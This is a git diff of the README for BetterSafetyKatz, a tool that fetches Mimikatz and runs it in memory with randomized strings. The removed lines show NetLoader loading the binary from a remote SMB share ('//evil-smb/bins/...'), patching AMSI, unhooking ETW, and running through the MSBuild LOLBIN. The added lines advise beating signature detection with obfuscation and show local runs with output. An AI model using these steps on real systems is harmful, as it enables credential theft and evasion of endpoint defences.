@@ -16,14 +16,9 @@ BetterSafetyKatz is licensed under the BSD 3-Clause license.
 
 ## Detected?
 
-BetterSafetyKatz is NOT (21.06.2020) currently detected by windows defender, when that happens, BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/NetLoader), this will keep bypassing common AV solutions such as Windows Defender.
+BetterSafetyKatz has basic signature detections by now, some obfuscation will do the trick! 
 
-	PS D:\Projects\NetLoader> .\NetLoader.exe --path //evil-smb/bins/BetterSafetyKatz.exe --args coffee
-	[!] ~Flangvik , ~Arno0x #NetLoader
-	[+] Successfully patched AMSI!
-	[+] Successfully unhooked ETW!
-	[+] URL/PATH : //evil-smb/bins/BetterSafetyKatz.exe
-	[+] Arguments : coffee
+	PS D:\Projects\NetLoader> .\BetterSafetyKatz.exe 
 	[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
 	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
 	[+] Randomizing strings in memory
@@ -47,31 +42,19 @@ BetterSafetyKatz is NOT (21.06.2020) currently detected by windows defender, whe
 
 	022PO6WM #
 	
-Or via the NetLoader MSBuild LOLBIN
+You can also specify a remote OR local path to unzip yourself (Not contacting the master GitHub repo)
 
-	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml
-	[!] ~Flangvik , ~Arno0x #NetLoader
-	[?] Input X in any field to exit!
-	[?] Is all input base64 encoded ? y/n -> n
-	[?] Input path or url -> //evil-smb/bins/BetterSafetyKatz.exe
-	[?] Is the payload data XOR encrypted ? y/n -> n
-	[?] Input payload args (optional) -> coffee
-	[+] Successfully patched AMSI!
-	[+] Successfully unhooked ETW!
-	[+] URL/PATH : //evil-smb/bins/BetterSafetyKatz.exe
-	[+] Arguments : coffee
+	PS D:\Tools\Katz> .\BetterSafetyKatz.exe '.\mimikatz_trunk.zip'                                         
 	[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
-	[+] Contacting repo -> 2.2.0-20200519/mimikatz_trunk.zip
+	[+] Fetching .\mimikatz_trunk.zip
 	[+] Randomizing strings in memory
 	[+] Suicide burn before CreateThread!
 
-	  .#####.   68ZIE9AI 2.2.0 (x64) #19041 May 19 2020 00:48:59
-	 .## ^ ##.  "I45FONZV6HINDTWWCMW" - (HVTPW)
-	 ## / \ ##  /*** F9FCR04M16WWWI `7SG36P16CR` ( GKMPJ36E@7SG36P16CR.com )
-	 ## \ / ##       > http://blog.7SG36P16CR.com/68ZIE9AI
-	 '## v ##'       FI7NFZ4XC3AJPVJ             ( JUEZ6AM590TQM1Q7NX6675W0 )
-	  '#####'        > 8GPZN7NSKR7J2QHBC8U2I / Y14PE2OPZ62A7LF9UP91WYX   ***/
+	  .#####.   83RMVZA8 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
+	 .## ^ ##.  "FPN5DDHQGD5GF7M775W" - (AX8RH)
+	 ## / \ ##  /*** 1HVUZ68IQYGG3I `EWE37C7HUD` ( R9ECUOAN@EWE37C7HUD.com )
+	 ## \ / ##       > http://blog.EWE37C7HUD.com/83RMVZA8
+	 '## v ##'       TTCPO5BUID45UFP             ( FD1XGKSOLS8XHA8DEW9X8VO9 )
+	  '#####'        > K8IYUY2XSLBG3S3VXV8ZN / POCIYP0U92KNJYG463LVDYJ   ***/
 
-	68ZIE9AI #
-	
-
+	83RMVZA8
